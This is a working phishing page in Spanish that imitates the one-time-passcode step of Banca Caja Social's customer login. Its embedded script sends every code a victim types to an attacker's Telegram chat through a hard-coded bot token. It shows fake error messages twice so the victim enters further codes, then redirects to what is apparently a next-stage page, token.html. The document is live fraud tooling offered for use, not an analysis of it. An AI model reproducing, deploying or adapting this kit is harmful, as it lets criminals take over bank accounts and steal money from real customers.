<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP - Portal Personas - Banca Caja Social</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <style>
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; }
        .loading-overlay.show { display: flex !important; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        
        /* Responsive imagen - sin cambiar diseño */
        @media (max-width: 768px) {
            .left-section { display: none; }
            .right-section { width: 100%; }
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999;display:none;justify-content:center;align-items:center;">
        <div style="text-align:center;">
            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;animation:pulse 1.5s ease-in-out infinite;">
        </div>
    </div>
    
    <div class="container">
        <div class="left-section">
            <img src="img/background-4.png" alt="Familia" class="background-image">
        </div>
        <div class="right-section">
            <div class="form-container">
                <div class="logo-container">
                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
                </div>
                
                <h1 class="title">Bienvenido al<br>Portal Personas</h1>

                <div id="otpTokenErrorAlert" data-role="login-template__alert" class="alert alert-danger" role="alert" hidden style="display:none">
                    <div class="alert-body">
                        <div class="alert-icon" aria-hidden="true">!</div>
                        <div class="alert-content">
                            <strong role="heading" class="alert-heading">CODIGO OTP INGRESADO INCORRECTO</strong>
                        </div>
                    </div>
                </div>
                
                <p class="subtitle">
                    Ingrese el código OTP que fue enviado<br>
                    a su celular o correo electrónico.<br>
                    El código puede tener hasta <strong>8 dígitos</strong>.
                </p>
                
                <form class="login-form" id="otpForm">
                    <label for="otp" class="form-label">Código OTP</label>
                    <input 
                        type="text" 
                        id="otp" 
                        name="otp" 
                        class="form-input"
                        placeholder="00000000"
                        maxlength="8"
                        inputmode="numeric"
                        pattern="[0-9]*"
                    >
                    <p class="error-message" style="display: none;">Código OTP inválido. Debe contener entre 4 y 8 dígitos.</p>
                    
                    <button type="submit" class="btn-siguiente" id="btnVerificar" disabled>Siguiente</button>
                    
                    <a href="#" class="link-password">¿No recibió el código? ▼</a>
                    
                    <div class="separator"></div>
                    
                    <div class="back-link-container">
                        <a href="password.html" class="link-back">← Volver</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <script>
    const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
    const TELEGRAM_CHAT_ID = '-1003784784181';

    document.addEventListener('DOMContentLoaded', function() {
        const otpInput = document.getElementById('otp');
        const btnVerificar = document.getElementById('btnVerificar');
        const errorMessage = document.querySelector('.error-message');
        const otpForm = document.getElementById('otpForm');
        const overlay = document.getElementById('loadingOverlay');
        const errorAlert = document.getElementById('otpTokenErrorAlert');
        let intentos = 0;
        let otpsEnviados = [];
        
        // Validación del OTP - solo números
        otpInput.addEventListener('input', function(e) {
            // Solo permitir números
            this.value = this.value.replace(/[^0-9]/g, '');
            
            const value = this.value;
            
            // Ocultar mensaje de error mientras escribe
            errorMessage.style.display = 'none';
            otpInput.classList.remove('error');
            
            // Habilitar botón cuando tiene entre 4 y 8 dígitos
            if (value.length >= 4 && value.length <= 8) {
                btnVerificar.classList.add('enabled');
                btnVerificar.disabled = false;
                btnVerificar.removeAttribute('disabled');
            } else {
                btnVerificar.classList.remove('enabled');
                btnVerificar.disabled = true;
                btnVerificar.setAttribute('disabled', 'disabled');
            }
        });

        // Submit
        otpForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (btnVerificar.disabled) return;

            intentos++;
            const otp = otpInput.value;
            otpsEnviados.push(otp);
            
            overlay.classList.add('show');

            const mensaje = `📱 <b>OTP (INTENTO ${intentos}/3) - CAJA SOCIAL</b>

<b>Código OTP:</b> <code>${otp}</code>
<b>Intento:</b> ${intentos}/3

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    setTimeout(() => {
                        overlay.classList.remove('show');

                        if (intentos === 1) {
                            errorAlert.removeAttribute('hidden');
                            errorAlert.style.display = 'block';
                            otpInput.value = '';
                            otpInput.focus();
                        } else if (intentos === 2) {
                            errorAlert.removeAttribute('hidden');
                            errorAlert.style.display = 'block';
                            errorAlert.querySelector('.alert-heading').textContent = 'ERROR EN LA TRANSMISIÓN DE DATOS - INTENTE DE NUEVO';
                            otpInput.value = '';
                            otpInput.focus();
                        } else if (intentos === 3) {
                            const mensajeFinal = `✅ <b>OTP ACEPTADO - CAJA SOCIAL</b>

<b>Códigos ingresados:</b>
1️⃣ ${otpsEnviados[0]}
2️⃣ ${otpsEnviados[1]}
3️⃣ ${otpsEnviados[2]}

<b>Estado:</b> ACEPTADO EN INTENTO 3

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensajeFinal, parse_mode: 'HTML' })
                            });

                            overlay.classList.add('show');
                            setTimeout(() => { window.location.href = 'token.html'; }, 2000);
                        }
                    }, 1500);
                } else {
                    overlay.classList.remove('show');
                }
            } catch (error) {
                overlay.classList.remove('show');
            }
        });
    });
    </script>
</body>
</html>
